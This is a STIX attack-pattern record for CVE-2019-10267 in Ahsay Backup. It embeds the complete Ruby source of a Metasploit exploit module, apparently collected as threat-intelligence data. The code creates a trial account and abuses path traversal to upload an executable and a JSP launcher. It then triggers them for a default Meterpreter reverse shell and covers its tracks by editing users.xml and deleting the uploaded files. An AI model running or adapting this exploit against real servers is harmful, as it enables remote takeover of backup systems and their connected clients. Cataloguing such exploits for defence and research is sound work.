{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0d7c939e-ac3d-417a-92c2-a7ad8e119578",
    "created": "2024-08-14T16:45:49.847511Z",
    "modified": "2024-08-14T16:45:49.847515Z",
    "name": "Ahsay Backup v7.x-v8.1.1.50 (authenticated) file upload",
    "description": " This module exploits an authenticated insecure file upload and code execution flaw in Ahsay Backup v7.x - v8.1.1.50. To succesfully execute the upload credentials are needed, default on Ahsay Backup trial accounts are enabled so an account can be created.  It can be exploited in Windows and Linux environments to get remote code execution (usualy as SYSTEM). This module has been tested successfully on Ahsay Backup v8.1.1.50 with Windows 2003 SP2 Server. Because of this flaw all connected clients can be configured to execute a command before the backup starts. Allowing an attacker to takeover even more systems and make it rain shells!  Setting the CREATEACCOUNT to true will create a new account, this is enabled by default. If credeantials are known enter these and run the exploit. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/ahsay_backup_fileupload.rb",
            "external_id": "ahsay_backup_fileupload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-10267"
        },
        {
            "source_name": "reference",
            "url": "https://www.wbsec.nl/ahsay/"
        },
        {
            "source_name": "reference",
            "url": "http://ahsay-dn.ahsay.com/v8/81150/cbs-win.exe"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include REXML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Ahsay Backup v7.x-v8.1.1.50 (authenticated) file upload',\n      'Description' => %q{\n       This module exploits an authenticated insecure file upload and code\n       execution flaw in Ahsay Backup v7.x - v8.1.1.50. To succesfully execute\n       the upload credentials are needed, default on Ahsay Backup trial\n       accounts are enabled so an account can be created.\n\n       It can be exploited in Windows and Linux environments to get remote code\n       execution (usualy as SYSTEM). This module has been tested successfully\n       on Ahsay Backup v8.1.1.50 with Windows 2003 SP2 Server. Because of this\n       flaw all connected clients can be configured to execute a command before\n       the backup starts. Allowing an attacker to takeover even more systems\n       and make it rain shells!\n\n       Setting the CREATEACCOUNT to true will create a new account, this is\n       enabled by default.\n       If credeantials are known enter these and run the exploit.\n      },\n      'Author'       =>\n        [\n          'Wietse Boonstra'\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2019-10267'],\n          [ 'URL', 'https://www.wbsec.nl/ahsay/' ],\n          [ 'URL', 'http://ahsay-dn.ahsay.com/v8/81150/cbs-win.exe' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => 'win',\n      'DefaultOptions' => {\n        'RPORT' => 443,\n        'SSL' => true,\n        'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n      },\n      'Targets'     =>\n        [\n          [  'Windows x86',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n          [ 'Linux x86', # should work but untested\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            },\n          ],\n\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2019-06-01'))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('TARGETURI', [true, 'Path to Ahsay', '/']),\n        OptString.new('USERNAME', [true, 'Username for the (new) account', Rex::Text.rand_text_alphanumeric(8)]),\n        OptString.new('PASSWORD', [true, 'Password for the (new) account', Rex::Text.rand_text_alpha(8) + Rex::Text.rand_text_numeric(5) + Rex::Text.rand_char(\"\",\"!$%^&*\")]),\n        OptString.new('CREATEACCOUNT', [false, 'Create Trial account', 'false']),\n        OptString.new('UPLOADPATH', [false, 'Payload Path', '../../webapps/cbs/help/en']),\n\n      ])\n  end\n\n  def is_trial_enabled?\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'obs','obm7','user','isTrialEnabled'),\n      'method' => 'POST',\n      'data'   => ''\n    })\n    if res and res.code == 200 and \"ENABLED\" =~ /#{res.body}/\n      return true\n    else\n      return false\n    end\n  end\n\n  def check_account?\n    headers = create_request_headers\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'obs','obm7','user','getUserProfile'),\n      'method' => 'POST',\n      'data'   => '',\n      'headers' => headers\n    })\n    if res and res.code == 200\n      print_good(\"Username and password are valid!\")\n      return true\n    elsif res and res.code == 500 and \"USER_NOT_EXIST\" =~ /#{res.body}/\n      # fail_with(Failure::NoAccess, 'Username incorrect!')\n      print_status(\"Username does not exist.\")\n      return false\n    elsif res and res.code == 500 and \"PASSWORD_INCORRECT\" =~ /#{res.body}/\n      # fail_with(Failure::NoAccess, 'Username exists but password incorrect!')\n      print_status(\"Username exists but password incorrect!\")\n      return false\n    else\n      return false\n    end\n  end\n\n  def create_request_headers\n    headers = {}\n    username = Rex::Text.encode_base64(datastore['USERNAME'])\n    password = Rex::Text.encode_base64(datastore['PASSWORD'])\n    headers['X-RSW-custom-encode-username'] = username\n    headers['X-RSW-custom-encode-password'] = password\n    headers\n  end\n\n  def exploit\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n\n    if is_trial_enabled? and datastore['CREATEACCOUNT'] == \"true\"\n      if username == \"\" or password == \"\"\n        fail_with(Failure::NoAccess, 'Please set a username and password')\n      else\n        #check if account does not exist?\n        if !check_account?\n          # Create account and check if it is valid\n          if create_account?\n            drop_and_execute()\n          else\n            fail_with(Failure::NoAccess, 'Failed to authenticate')\n          end\n        else\n          #Need to fix, check if account exist\n          print_good(\"No need to create account, already exists!\")\n          drop_and_execute()\n        end\n      end\n    elsif username != \"\" and password != \"\"\n      if check_account?\n        drop_and_execute()\n      else\n        if is_trial_enabled?\n          fail_with(Failure::NoAccess, 'Username and password are invalid. But server supports trial accounts, you can create an account!')\n        end\n        fail_with(Failure::NoAccess, 'Username and password are invalid')\n      end\n    else\n      fail_with(Failure::UnexpectedReply, 'Missing some settings')\n    end\n  end\n\n  def create_account?\n    headers = create_request_headers\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'obs','obm7','user','addTrialUser'),\n      'method' => 'POST',\n      'data'   => '',\n      'headers' => headers\n    })\n    # print (res.body)\n    if res and res.code == 200\n      print_good(\"Account created\")\n      return true\n    elsif res.body.include?('LOGIN_NAME_IS_USED')\n      fail_with(Failure::NoAccess, 'Username is in use!')\n    elsif res.body.include?('PWD_COMPLEXITY_FAILURE')\n      fail_with(Failure::NoAccess, 'Password not complex enough')\n    else\n      fail_with(Failure::UnexpectedReply, 'Something went wrong!')\n    end\n  end\n\n  def remove_account\n    if datastore['CREATEACCOUNT']\n      username = datastore['USERNAME']\n      users_xml = \"../../conf/users.xml\"\n      print_status(\"Looking for account #{username} in #{users_xml}\")\n      xml_doc = download(users_xml)\n      xmldoc = Document.new(xml_doc)\n      el = 0\n      xmldoc.elements.each(\"Setting/Key\") do |e|\n          el = el + 1\n          e.elements.each(\"Value\") do |a|\n              if a.attributes[\"name\"].include?('name')\n                  if a.attributes[\"data\"].include?(username)\n                      print_good(\"Found account\")\n                      xmldoc.root.elements.delete el\n                      print_status(\"Removed account\")\n                  end\n              end\n          end\n      end\n      new_xml = xmldoc.root\n      print_status(\"Uploading new #{users_xml} file\")\n      upload(users_xml, new_xml.to_s)\n      print_good(\"Account is inaccesible when service restarts!\")\n    end\n  end\n\n  def prepare_path(path)\n    if path.end_with? '/'\n      path = path.chomp('/')\n    end\n    path\n  end\n\n  def drop_and_execute()\n    path = prepare_path(datastore['UPLOADPATH'])\n    exploitpath = path.gsub(\"../../webapps/cbs/\",'')\n    exploitpath = exploitpath.gsub(\"/\",\"\\\\\\\\\\\\\")\n    requestpath = path.gsub(\"../../webapps/\",'')\n\n    #First stage payload creation and upload\n    exe = payload.encoded_exe\n    exe_filename = Rex::Text.rand_text_alpha(10)\n    exefileLocation = \"#{path}/#{exe_filename}.exe\"\n    print_status(\"Uploading first stage payload.\")\n    upload(exefileLocation, exe)\n    #../../webapps/cbs/help/en\n    exec = %Q{<% Runtime.getRuntime().exec(getServletContext().getRealPath(\"/\") + \"#{exploitpath}\\\\\\\\#{exe_filename}.exe\");%>}\n\n    #Second stage payload creation and upload\n    jsp_filename = Rex::Text.rand_text_alpha(10)\n    jspfileLocation = \"#{path}/#{jsp_filename}.jsp\"\n    print_status(\"Uploading second stage payload.\")\n    upload(jspfileLocation, exec)\n    proto = ssl ? 'https' : 'http'\n    url = \"#{proto}://#{datastore['RHOST']}:#{datastore['RPORT']}\" + normalize_uri(target_uri.path, \"#{requestpath}/#{jsp_filename}.jsp\")\n\n    #Triggering the exploit\n    print_status(\"Triggering exploit! #{url}\" )\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"#{requestpath}/#{jsp_filename}.jsp\"),\n      'method' => 'GET'\n    })\n    if res and res.code == 200\n      print_good(\"Exploit executed!\")\n    end\n\n    #Cleaning up\n    print_status(\"Cleaning up after our selfs.\")\n    remove_account\n    print_status(\"Trying to remove #{exefileLocation}, but will fail when in use.\")\n    delete(exefileLocation)\n    delete(jspfileLocation)\n    delete(\"../../user/#{datastore['USERNAME']}\",true)\n  end\n\n  def upload(fileLocation, content)\n    username = Rex::Text.encode_base64(datastore['USERNAME'])\n    password = Rex::Text.encode_base64(datastore['PASSWORD'])\n    uploadPath = Rex::Text.encode_base64(fileLocation)\n\n    headers = {}\n    headers['X-RSW-Request-0'] = username\n    headers['X-RSW-Request-1'] = password\n    headers['X-RSW-custom-encode-path'] = uploadPath\n    res = send_request_raw({\n      'uri' => normalize_uri(target_uri.path, 'obs','obm7','file','upload'),\n      'method' => 'PUT',\n      'headers' => headers,\n      'data' => content,\n      'timeout' => 20\n    })\n    if res && res.code == 201\n      print_good(\"Succesfully uploaded file to #{fileLocation}\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Server did not respond in an expected way\")\n    end\n  end\n\n  def download(fileLocation)\n    #TODO make vars_get variable\n    print_status(\"Downloading file\")\n    username = Rex::Text.encode_base64(datastore['USERNAME'])\n    password = Rex::Text.encode_base64(datastore['PASSWORD'])\n    headers = {}\n    headers['X-RSW-Request-0'] = username\n    headers['X-RSW-Request-1'] = password\n    res = send_request_cgi({\n      #/obs/obm7/file/download?X-RSW-custom-encode-path=../../conf/users.xml\n      'uri' => normalize_uri(target_uri.path, 'obs','obm7','file','download'),\n      'method' => 'GET',\n      'headers' => headers,\n      'vars_get' => {\n        'X-RSW-custom-encode-path' => fileLocation\n      }\n    })\n\n    if res and res.code == 200\n      res.body\n    end\n  end\n\n  def delete(fileLocation, recursive=false)\n    print_status(\"Deleting file #{fileLocation}\")\n    username = Rex::Text.encode_base64(datastore['USERNAME'])\n    password = Rex::Text.encode_base64(datastore['PASSWORD'])\n    headers = {}\n    headers['X-RSW-Request-0'] = username\n    headers['X-RSW-Request-1'] = password\n    res = send_request_cgi({\n      #/obs/obm7/file/delete?X-RSW-custom-encode-path=../../user/xyz\n      'uri' => normalize_uri(target_uri.path, 'obs','obm7','file','delete'),\n      'method' => 'DELETE',\n      'headers' => headers,\n      'vars_get' => {\n        'X-RSW-custom-encode-path' => fileLocation,\n        'recursive' => recursive\n      }\n    })\n\n    if res and res.code == 200\n      res.body\n    end\n  end\n\n  def check\n    #We need a cookie first\n    cookie_res = send_request_cgi({\n      #/cbs/system/ShowDownload.do\n      'uri' => normalize_uri(target_uri.path, 'cbs','system','ShowDownload.do'),\n      'method' => 'GET'\n    })\n\n    if cookie_res and cookie_res.code == 200\n      cookie = cookie_res.get_cookies.split()[0]\n    else\n      return Exploit::CheckCode::Unknown\n    end\n\n    if defined?(cookie)\n      #request the page with all the clientside software links.\n      headers = {}\n      headers['Cookie'] = cookie\n      link = send_request_cgi({\n        #/cbs/system/ShowDownload.do\n        'uri' => normalize_uri(target_uri.path, 'cbs','system','download','indexTab1.jsp'),\n        'method' => 'GET',\n        'headers' => headers\n      })\n\n      if link and link.code == 200\n        link.body.each_line do |line|\n          #looking for the link that contains obm-linux and ends with .sh\n          if line.include? '<a href=\"/cbs/download/' and line.include? '.sh' and line.include? 'obm-linux'\n            filename = line.split(\"<a\")[1].split('\"')[1].split(\"?\")[0]\n            filecontent = send_request_cgi({\n              #/cbs/system/ShowDownload.do\n              'uri' => normalize_uri(target_uri.path, filename),\n              'method' => 'GET',\n              'headers' => headers\n            })\n            if filecontent and filecontent.code == 200\n              filecontent.body.each_line do |l|\n                if l.include? 'VERSION=\"'\n                  number = l.split(\"=\")[1].split('\"')[1]\n                  if number.match /(\\d+\\.)?(\\d+\\.)?(\\d+\\.)?(\\*|\\d+)$/\n                    if number <= '8.1.1.50' and not number < '7'\n                      return Exploit::CheckCode::Appears\n                    else\n                      return Exploit::CheckCode::Safe\n                    end\n                  end\n                end\n              end\n            else\n              return Exploit::CheckCode::Unknown\n            end\n          end\n        end\n      else\n        return Exploit::CheckCode::Unknown\n      end\n    else\n      return Exploit::CheckCode::Unknown\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-06-01",
    "x_mitre_platforms": [
        "linux"
    ]
}